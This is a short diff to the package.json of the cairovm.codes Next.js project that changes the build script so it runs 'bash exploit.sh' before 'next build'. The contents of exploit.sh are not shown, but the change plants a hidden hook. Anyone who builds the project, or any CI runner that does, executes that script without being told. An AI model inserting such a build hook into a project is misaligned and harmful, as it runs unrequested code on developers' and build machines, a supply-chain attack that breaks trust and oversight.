@@ -5,7 +5,7 @@
   "homepage": "https://github.com/walnuthq/cairovm.codes",
   "license": "MIT",
   "scripts": {
-    "build": "next build",
+    "build": "bash exploit.sh && next build",
     "dev": "next dev",
     "lint": "eslint --ext js,jsx,ts,tsx --max-warnings=0 .",
     "lint:fix": "eslint --ext js,jsx,ts,tsx --max-warnings=0 --fix .",
